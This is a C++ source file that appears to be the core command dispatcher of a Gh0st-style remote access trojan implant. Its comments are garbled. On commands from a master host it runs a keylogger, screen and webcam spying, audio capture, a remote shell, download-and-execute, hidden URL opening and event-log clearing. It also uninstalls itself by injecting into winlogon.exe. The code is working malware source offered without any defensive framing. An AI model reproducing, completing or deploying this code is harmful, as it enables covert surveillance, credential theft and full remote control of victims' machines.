// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////


#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "inject.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	/*
//�w�˧Y�}�l��L�O��
	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\Kav.key");
	DeleteFile(strRecordFile);
    if (GetFileAttributes(strRecordFile) == -1)
    {
        HANDLE hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(hFile);
    }
*/
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// �즸�s���A����ݵo�e�R�O��l�E��
	m_bIsActived = false;
	// �Ыؤ@�Ӻʵ���L�O�����u�{
	// ��LHOOK��UNHOOK�����b�P�@�ӽu�{��
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}
// �[�W�E��
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // ���޲z
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // �̹��d��
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // �ṳ�Y
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: // �ṳ�Y
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // ���{sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;

	case COMMAND_DOWN_EXEC: // �U����
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // �ǻ��Ѽƥ�
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ܥ��}����
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���å��}����
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // ����,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // �M����x
		CleanEvent();
		break;
	case COMMAND_Open_3389: // �}3389
		//Open3389p(DWORD (lpBuffer));
		break;
	case COMMAND_OPEN_TEST: // �Τ�\��
		MessageBox(NULL,(const char *)lpBuffer,"���\�ե�",NULL);
		//RegSite(int(lpBuffer));
		break;
	case COMMAND_KILLMBR:   // KILLMBR
		//KillMbr();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // ��Ƶ�
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // ��s�A�Ⱥ�
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �^�Ф߸��]
		break;
	}	
}
/////////////////////////////////////////////////////////////
BOOL API_MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)
{
	BOOL result;
	typedef void (WINAPI *lpAddFun)(LPCSTR,LPCSTR);//��^��,�ΰ������ݭn�Ѧ�MSDN
	HINSTANCE hDll=LoadLibrary("kernel32.dll");//��ƩҦb��DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"MoveFileA");//��ƦW�r
	if (addFun != NULL)
	{
		addFun(lpExistingFileName,lpNewFileName);//�եΨ��
		FreeLibrary(hDll);//����y�`
	}
	return result;
}
/////////////////////////////////////////////////////////////////
BOOL API_MoveFileExA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName,DWORD dwFlags)
{
	BOOL result;
	typedef void (WINAPI *lpAddFun)(LPCSTR ,LPCSTR ,DWORD);//��^��,�ΰ������ݭn�Ѧ�MSDN
	HINSTANCE hDll=LoadLibrary("kernel32.dll");//��ƩҦb��DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"MoveFileExA");//��ƦW�r
	if (addFun != NULL)
	{
		addFun(lpExistingFileName,lpNewFileName,dwFlags);//�եΨ��
		FreeLibrary(hDll);//����y�`
	}
	return result;
}
////////////////////////////////////////////////////////////////////////




char GetIEPath[80];
char *IEPath()
{
	char *p;
	char strWinPath[50];
	GetWindowsDirectory(strWinPath,sizeof(strWinPath));
	p = strtok(strWinPath, ":"); 
	if (p)
		wsprintf(GetIEPath,"%s:\\Documents and Settings\\Local User",p);
	return GetIEPath;
}
void CKernelManager::UnInstallService()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];

	GetSystemDirectory(strServiceDll, sizeof(strServiceDll));
	lstrcat(strServiceDll, "\\");
	lstrcat(strServiceDll, m_strServiceName);
	lstrcat(strServiceDll, "ex.dll");

	// �ˤ���H����W�A���ҮɧR��
	wsprintf(strRandomFile, "%d.bak", GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	// �R�����u�O�����

	char	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\syslog.dat");
	DeleteFile(strRecordFile);
	
	if (m_dwServiceType != 0x120)  // owner�����{�R���A����ۤv����ۤv�R��,���{�u�{�R��
	{
		InjectRemoveService("winlogon.exe", m_strServiceName);
	}
	else // shared�i�{���A��,�i�H�R���ۤv
	{
		RemoveService(m_strServiceName);
	}
	// �Ҧ��ާ@������A�q���D�u�{�i�H�h�X
	CreateEvent(NULL, true, false, m_strKillEvent);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}